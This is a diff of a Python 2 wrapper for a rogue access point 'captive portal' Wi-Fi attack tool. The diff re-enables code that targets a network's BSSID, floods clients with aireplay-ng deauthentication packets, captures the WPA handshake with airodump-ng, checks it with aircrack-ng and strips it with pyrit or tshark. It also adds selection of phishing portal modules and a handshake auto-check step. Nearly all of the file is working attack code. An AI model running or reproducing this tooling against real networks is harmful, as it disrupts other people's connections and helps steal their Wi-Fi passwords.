@@ -5,23 +5,6 @@ import time
 import sys
 import os
 
-from templates import template_list
-tl = template_list.template_list
-
-################################################################################################
-
-if os.path.isfile('/tmp/web_server.PID'):
-	print "[!] File /tmp/web_server.PID found (maybe captive_portal is running), try:"
-	print "    ./captive_portal.sh stop"
-	sys.exit(1)
-
-if os.path.isfile('/tmp/dns_server.PID'):
-	print "[!] File /tmp/dns_server.PID found, (maybe captive_portal is running), try:"
-	print "    ./captive_portal.sh stop"
-	sys.exit(1)
-
-################################################################################################
-
 script_name = "captive_portal.sh"
 
 ap_interface  = ""
@@ -29,12 +12,13 @@ mon_interface = ""
 ap_target = None
 deauth_targets = []
 
-chosen_module = ""
+folder_module = ""
+module = ""
 
 ap_channel = ""
 ap_ssid = ""
 ap_password = ""
-# handshake_path = ""
+handshake_path = ""
 deauth = False
 deauth_mode = None
 
@@ -128,189 +112,189 @@ def delete_old_airodump_files (directory):
 
 # ------------------------------------------------------------------------- #
 
-# def has_handshake_aircrack(target, capfile):
-# 	"""
-# 		Uses aircrack-ng to check for handshake.
-# 		Returns True if found, False otherwise.
-# 	"""
-# 	if not program_exists('aircrack-ng'): return False
-# 	crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target["mac"] + ' ' + capfile
-# 	proc_crack = subprocess.Popen(crack, stdout=subprocess.PIPE, stderr=DN, shell=True)
-# 	proc_crack.wait()
-# 	txt = proc_crack.communicate()[0]
-# 	return (txt.find('Passphrase not in dictionary') != -1)
+def has_handshake_aircrack(target, capfile):
+	"""
+		Uses aircrack-ng to check for handshake.
+		Returns True if found, False otherwise.
+	"""
+	if not program_exists('aircrack-ng'): return False
+	crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target["mac"] + ' ' + capfile
+	proc_crack = subprocess.Popen(crack, stdout=subprocess.PIPE, stderr=DN, shell=True)
+	proc_crack.wait()
+	txt = proc_crack.communicate()[0]
+	return (txt.find('Passphrase not in dictionary') != -1)
 
 
 
-# def strip_handshake(capfile):
-# 	"""
-# 		Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
-# 		File in location 'capfile' is overwritten!
-# 	"""
-# 	output_file = capfile
-# 	if program_exists('pyrit'):
-# 		cmd = ['pyrit',
-# 			   '-r', capfile,
-# 			   '-o', capfile + '.temp',
-# 			   'stripLive']
-# 		print "[*] Stripping handshake using pyrit..."
-# 		subprocess.call(cmd, stdout=DN, stderr=DN)
-# 		rename(capfile + '.temp', output_file)
+def strip_handshake(capfile):
+	"""
+		Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
+		File in location 'capfile' is overwritten!
+	"""
+	output_file = capfile
+	if program_exists('pyrit'):
+		cmd = ['pyrit',
+			   '-r', capfile,
+			   '-o', capfile + '.temp',
+			   'stripLive']
+		print "[*] Stripping handshake using pyrit..."
+		subprocess.call(cmd, stdout=DN, stderr=DN)
+		rename(capfile + '.temp', output_file)
 
-# 	elif program_exists('tshark'):
-# 		# strip results with tshark
-# 		cmd = ['tshark',
-# 			   '-r', capfile,  # input file
-# 			   '-R', 'eapol || wlan_mgt.tag.interpretation',  # filter
-# 			   '-2', # -R is deprecated and requires -2
-# 			   '-w', capfile + '.temp']  # output file
-# 		print "[*] Stripping handshake using tshark..."
-# 		proc_strip = subprocess.call(cmd, stdout=DN, stderr=DN)
+	elif program_exists('tshark'):
+		# strip results with tshark
+		cmd = ['tshark',
+			   '-r', capfile,  # input file
+			   '-R', 'eapol || wlan_mgt.tag.interpretation',  # filter
+			   '-2', # -R is deprecated and requires -2
+			   '-w', capfile + '.temp']  # output file
+		print "[*] Stripping handshake using tshark..."
+		proc_strip = subprocess.call(cmd, stdout=DN, stderr=DN)
 
-# 		rename(capfile + '.temp', output_file)
+		rename(capfile + '.temp', output_file)
 
-# 	else:
-# 		print "[!] Unable to strip .cap file: neither pyrit nor tshark were found"
+	else:
+		print "[!] Unable to strip .cap file: neither pyrit nor tshark were found"
 
-# # ------------------------------------------------------------------------- #
+# ------------------------------------------------------------------------- #
 
-# def grab_handshake (target, iface):
+def grab_handshake (target, iface):
 
-# 	WPA_ATTACK_TIMEOUT = 500
-# 	WPA_DEAUTH_TIMEOUT = 10
-# 	WPA_DEAUTH_COUNT = 5
-# 	WPA_STRIP_HANDSHAKE = True
-# 	MAX_ERROR = 5
-# 	DIRECTORY = "./hs/"
+	WPA_ATTACK_TIMEOUT = 500
+	WPA_DEAUTH_TIMEOUT = 10
+	WPA_DEAUTH_COUNT = 5
+	WPA_STRIP_HANDSHAKE = True
+	MAX_ERROR = 5
+	DIRECTORY = "./hs/"
 
-# 	# Generate the filename to save the .cap file as <SSID>_aa_bb_cc_dd_ee_ff.cap
-# 	save_as = "handshake_" + target["essid"].replace(" ", "_") + "_" + target["mac"].replace(":", "-") + ".cap"
+	# Generate the filename to save the .cap file as <SSID>_aa_bb_cc_dd_ee_ff.cap
+	save_as = "handshake_" + target["essid"].replace(" ", "_") + "_" + target["mac"].replace(":", "-") + ".cap"
 
-# 	# Process init
-# 	proc_read = None
-# 	proc_deauth = None
+	# Process init
+	proc_read = None
+	proc_deauth = None
 
-# 	# CHECK IF AN HANDSHAKE EXIST ALREADY, and exits function
-# 	if os.path.isfile(DIRECTORY + save_as): 
-# 		print "[*] Handshake already grabbed for: " + target["essid"] + " (" + target["mac"] + ")"
-# 		return DIRECTORY + save_as
+	# CHECK IF AN HANDSHAKE EXIST ALREADY, and exits function
+	if os.path.isfile(DIRECTORY + save_as): 
+		print "[*] Handshake already grabbed for: " + target["essid"] + " (" + target["mac"] + ")"
+		return DIRECTORY + save_as
 
-# 	# Check if directory exits, or make it
-# 	if not os.path.isdir(DIRECTORY):
-# 		try:
-# 			os.mkdir(DIRECTORY)
-# 		except Exception, e:
-# 			print e
-# 			DIRECTORY = "./"
+	# Check if directory exits, or make it
+	if not os.path.isdir(DIRECTORY):
+		try:
+			os.mkdir(DIRECTORY)
+		except Exception, e:
+			print e
+			DIRECTORY = "./"
 
-# 	# Deleting old airodump files
-# 	delete_old_airodump_files (DIRECTORY)
+	# Deleting old airodump files
+	delete_old_airodump_files (DIRECTORY)
 
-# 	try:
-# 		# Start airodump-ng process to capture handshakes
-# 		cmd = ['airodump-ng',
-# 			   '-w', DIRECTORY + 'wpa',
-# 			   '-c', target["channel"],
-# 			   '--write-interval', '1',
-# 			   '--bssid', target["mac"],
-# 			   iface]
-# 		proc_read = subprocess.Popen(cmd, stdout=DN, stderr=DN)
+	try:
+		# Start airodump-ng process to capture handshakes
+		cmd = ['airodump-ng',
+			   '-w', DIRECTORY + 'wpa',
+			   '-c', target["channel"],
+			   '--write-interval', '1',
+			   '--bssid', target["mac"],
+			   iface]
+		proc_read = subprocess.Popen(cmd, stdout=DN, stderr=DN)
 
-# 		# Setting deauthentication process here to avoid errors later on
-# 		got_handshake = False
+		# Setting deauthentication process here to avoid errors later on
+		got_handshake = False
 
-# 		print "[*] Starting listening for " + target["essid"] + " (" + target["mac"] + ")..."
+		print "[*] Starting listening for " + target["essid"] + " (" + target["mac"] + ")..."
 
-# 		error_count = 0
-# 		seconds_running = 0
-# 		seconds_since_last_deauth = 0
-# 		start_time = time.time()
+		error_count = 0
+		seconds_running = 0
+		seconds_since_last_deauth = 0
+		start_time = time.time()
 
-# 		# Deauth and check-for-handshake loop
-# 		while ((not got_handshake) and (WPA_ATTACK_TIMEOUT <= 0 or seconds_running < WPA_ATTACK_TIMEOUT)):
+		# Deauth and check-for-handshake loop
+		while ((not got_handshake) and (WPA_ATTACK_TIMEOUT <= 0 or seconds_running < WPA_ATTACK_TIMEOUT)):
 			
-# 			if (error_count >= MAX_ERROR): print "\n[!] Too many errors, interrupting..."; break
+			if (error_count >= MAX_ERROR): print "\n[!] Too many errors, interrupting..."; break
 
-# 			if proc_read.poll() != None:
-# 				print "[!] airodump-ng exited with status " + str(proc_read.poll())
-# 				if ("proc_read.poll()" != "0"): error_count += 1
+			if proc_read.poll() != None:
+				print "[!] airodump-ng exited with status " + str(proc_read.poll())
+				if ("proc_read.poll()" != "0"): error_count += 1
 			
-# 			time.sleep(1)
-# 			seconds_since_last_deauth += int(time.time() - start_time - seconds_running)
-# 			seconds_running = int(time.time() - start_time)
+			time.sleep(1)
+			seconds_since_last_deauth += int(time.time() - start_time - seconds_running)
+			seconds_running = int(time.time() - start_time)
 
-# 			sys.stdout.write('.')
-#    			sys.stdout.flush()
+			sys.stdout.write('.')
+   			sys.stdout.flush()
 
-# 			if seconds_since_last_deauth > WPA_DEAUTH_TIMEOUT:
-# 				seconds_since_last_deauth = 0
+			if seconds_since_last_deauth > WPA_DEAUTH_TIMEOUT:
+				seconds_since_last_deauth = 0
 
-# 				# Send deauth packets via aireplay-ng
-# 				cmd = ['aireplay-ng',
-# 					   '--ignore-negative-one',
-# 					   '-0',  					# Attack method (Deauthentication)
-# 						str(WPA_DEAUTH_COUNT),  	# Number of packets to send
-# 					   '-a', target["mac"],
-# 					   '-D', iface]
+				# Send deauth packets via aireplay-ng
+				cmd = ['aireplay-ng',
+					   '--ignore-negative-one',
+					   '-0',  					# Attack method (Deauthentication)
+						str(WPA_DEAUTH_COUNT),  	# Number of packets to send
+					   '-a', target["mac"],
+					   '-D', iface]
 
-# 				print "\n[*] Sending deauth to broadcast..."
+				print "\n[*] Sending deauth to broadcast..."
 
-# 				# Send deauth packets via aireplay, wait for them to complete.
-# 				proc_deauth = subprocess.Popen(cmd, stdout=DN, stderr=DN)
-# 				proc_deauth.wait()
+				# Send deauth packets via aireplay, wait for them to complete.
+				proc_deauth = subprocess.Popen(cmd, stdout=DN, stderr=DN)
+				proc_deauth.wait()
 
-# 			# Copy current dump file for consistency
-# 			if not os.path.exists(DIRECTORY + 'wpa-01.cap'): continue
-# 			shutil.copy(DIRECTORY + 'wpa-01.cap', DIRECTORY + 'wpa-01.cap.temp')
+			# Copy current dump file for consistency
+			if not os.path.exists(DIRECTORY + 'wpa-01.cap'): continue
+			shutil.copy(DIRECTORY + 'wpa-01.cap', DIRECTORY + 'wpa-01.cap.temp')
 
-# 			# Check for handshake
-# 			if has_handshake_aircrack(target, DIRECTORY + 'wpa-01.cap.temp'):
-# 				got_handshake = True
+			# Check for handshake
+			if has_handshake_aircrack(target, DIRECTORY + 'wpa-01.cap.temp'):
+				got_handshake = True
 
-# 				# Kill the airodump and aireplay processes
-# 				send_interrupt(proc_read)
-# 				send_interrupt(proc_deauth)
+				# Kill the airodump and aireplay processes
+				send_interrupt(proc_read)
+				send_interrupt(proc_deauth)
 
-# 				# Save a copy of the handshake
-# 				rename(DIRECTORY + 'wpa-01.cap.temp', DIRECTORY + save_as)
+				# Save a copy of the handshake
+				rename(DIRECTORY + 'wpa-01.cap.temp', DIRECTORY + save_as)
 
-# 				print "\n[*] Handshake saved as: " + DIRECTORY + save_as
+				print "\n[*] Handshake saved as: " + DIRECTORY + save_as
 
-# 				# Strip handshake if needed
-# 				if WPA_STRIP_HANDSHAKE: strip_handshake(DIRECTORY + save_as)
+				# Strip handshake if needed
+				if WPA_STRIP_HANDSHAKE: strip_handshake(DIRECTORY + save_as)
 
-# 				break # Break out of while loop
+				break # Break out of while loop
 
-# 			# No handshake yet
-# 			os.remove(DIRECTORY + 'wpa-01.cap.temp')
-
-
-# 		# End of Handshake wait loop.
-# 		if not got_handshake:
-# 			print "\n[!] No handshake grabbed in time."
+			# No handshake yet
+			os.remove(DIRECTORY + 'wpa-01.cap.temp')
 
 
-# 	except Exception, e:
-# 		send_interrupt(proc_read)
-# 		send_interrupt(proc_deauth)
-# 		print "\n[!] " + str(e)
+		# End of Handshake wait loop.
+		if not got_handshake:
+			print "\n[!] No handshake grabbed in time."
 
-# 	except KeyboardInterrupt:
-# 		print "\n[!] User interruption."
-# 		send_interrupt(proc_read)
-# 		send_interrupt(proc_deauth)
 
-# 	send_interrupt(proc_read)
-# 	send_interrupt(proc_deauth)
+	except Exception, e:
+		send_interrupt(proc_read)
+		send_interrupt(proc_deauth)
+		print "\n[!] " + str(e)
 
-# 	# Deleting old airodump files
-# 	time.sleep (1)
-# 	delete_old_airodump_files (DIRECTORY)
+	except KeyboardInterrupt:
+		print "\n[!] User interruption."
+		send_interrupt(proc_read)
+		send_interrupt(proc_deauth)
 
-# 	print "\n"
+	send_interrupt(proc_read)
+	send_interrupt(proc_deauth)
 
-# 	if (got_handshake): return DIRECTORY + save_as
-# 	else: return False
+	# Deleting old airodump files
+	time.sleep (1)
+	delete_old_airodump_files (DIRECTORY)
+
+	print "\n"
+
+	if (got_handshake): return DIRECTORY + save_as
+	else: return False
 
 
 ################################################################################################
@@ -451,12 +435,10 @@ def deauth_thread (deauth_targets, interface):
 
 print "[*] Checking dependencies...\n"
 
-# dep = [
-# 		'iptables', 'php', 'psmisc', 'net-tools', 'aircrack-ng',
-# 		'bind9', 'hostapd', 'isc-dhcp-server', 'apache2'
-# 	]
-
-dep = [ 'iptables', 'psmisc', 'net-tools', 'aircrack-ng', 'screen', 'hostapd', 'isc-dhcp-server', 'python-dev', 'python-pip', 'python-dev', 'python-pip' ]
+dep = [
+		'iptables', 'php', 'psmisc', 'net-tools', 'aircrack-ng',
+		'bind9', 'hostapd', 'isc-dhcp-server', 'apache2'
+	]
 
 dep_missing = []
 
@@ -650,11 +632,37 @@ elif (mon_status == False): mon_interface == "NONE"
 
 ################################################################################################
 
-modules_list = []
-for e in tl:
-	modules_list.append(e)
+cmd = "ls ap_module -l | awk \'{print $9}\'"
+proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+folders_list = proc.stdout.read().split("\n")							# Read folders
+folders_list = [ s for s in folders_list if not "_bootstrap" in s ]		# Remove bootstrap
+folders_list = filter(None, folders_list)								# Remove empty strings
+folders_list = sorted(folders_list, key=str.lower)						# Sort alphabetically
 
-modules_list = sorted(modules_list)
+print "\n\n\n\n\n####################################"
+print "# Module Folder                    #"
+print "####################################"
+c = 1
+for f in folders_list:
+	if (c<10): print str(c) + ")  " + f
+	else:      print str(c) + ") "  + f
+	c += 1
+print "####################################"
+while (len(folder_module) < 1):
+	x = raw_input ("Choose: ")
+	try:
+		if (int(x) > 0):
+			folder_module = folders_list[int(x) - 1];
+	except: 
+		pass
+
+# ------------------------------------------------------------------------- #
+
+cmd = "ls ap_module/"+ folder_module + " -l | awk \'{print $9}\'"
+proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+modules_list = proc.stdout.read().split("\n")							# Read modules
+modules_list = filter(None, modules_list)								# Remove empty strings
+modules_list = sorted(modules_list, key=str.lower)						# Sort alphabetically
 
 print "\n\n\n\n\n####################################"
 print "# Module                           #"
@@ -665,11 +673,11 @@ for f in modules_list:
 	else:      print str(c) + ") "  + f
 	c += 1
 print "####################################"
-while (len(chosen_module) < 1):
+while (len(module) < 1):
 	x = raw_input ("Choose: ")
 	try:
 		if (int(x) > 0):
-			chosen_module = modules_list[int(x) - 1];
+			module = modules_list[int(x) - 1];
 	except: 
 		pass
 
@@ -718,27 +726,27 @@ while (len(ap_password) < 8):
 
 # ------------------------------------------------------------------------- #
 
-# tmp = raw_input ("-) Handshake (None): ")
-# if (len(tmp)<1): handshake_path = "NONE"
-# else: handshake_path = tmp
+tmp = raw_input ("-) Handshake (None): ")
+if (len(tmp)<1): handshake_path = "NONE"
+else: handshake_path = tmp
 
-# # ------------------------------------------------------------------------- #
+# ------------------------------------------------------------------------- #
 
-# if ((handshake_path == "NONE") and (mon_interface != "NONE")):
+if ((handshake_path == "NONE") and (mon_interface != "NONE")):
 
-# 	tmp = None
-# 	while ((tmp != "y") and (tmp != "n")):
-# 		tmp = raw_input ("-) Automatically grab handshake (y/n): ")
+	tmp = None
+	while ((tmp != "y") and (tmp != "n")):
+		tmp = raw_input ("-) Automatically grab handshake (y/n): ")
 
-# 	if (tmp == "y"):
-# 		hs = grab_handshake (ap_target, mon_interface)
-# 		if (hs == False): handshake_path = "NONE"
-# 		else: handshake_path = hs
-# 	else:
-# 		handshake_path = "NONE"
+	if (tmp == "y"):
+		hs = grab_handshake (ap_target, mon_interface)
+		if (hs == False): handshake_path = "NONE"
+		else: handshake_path = hs
+	else:
+		handshake_path = "NONE"
 
-# else:
-# 	pass
+else:
+	pass
 
 print "\n\n\n"
 
@@ -757,10 +765,10 @@ if (str(exit_code) != "0"):
 # ------------------------------------------------------------------------- #
 
 cmd =  "bash " + script_name + " -i " + ap_interface + " -c " + ap_channel
-cmd += " -s \"" + ap_ssid + "\" -m " + chosen_module
+cmd += " -s \"" + ap_ssid + "\" -m " + folder_module + "/" + module
 
 if (ap_password != "NONENONE"): cmd += " -p \"" + ap_password + "\""
-# if (handshake_path != "NONE"):  cmd += " -a \"" + handshake_path + "\""
+if (handshake_path != "NONE"):  cmd += " -a \"" + handshake_path + "\""
 
 cmd += " start"
 
@@ -851,14 +859,12 @@ else:
 
 ################################################################################################
 
-# if (handshake_path != "NONE"): cmd =  "bash " + script_name + " autocheck"
-# else: cmd =  "bash " + script_name + " check"
-
-cmd =  "bash " + script_name + " check"
+if (handshake_path != "NONE"): cmd =  "bash " + script_name + " autocheck"
+else: cmd =  "bash " + script_name + " check"
 
 exit_code = os.system (cmd)		# Run captive_portal.sh check
 
-print "\n\n[*] Script terminated."
+print "\n\n[*] Script terminated, wait for reset..."
 
 time.sleep (5)
 deauth = False
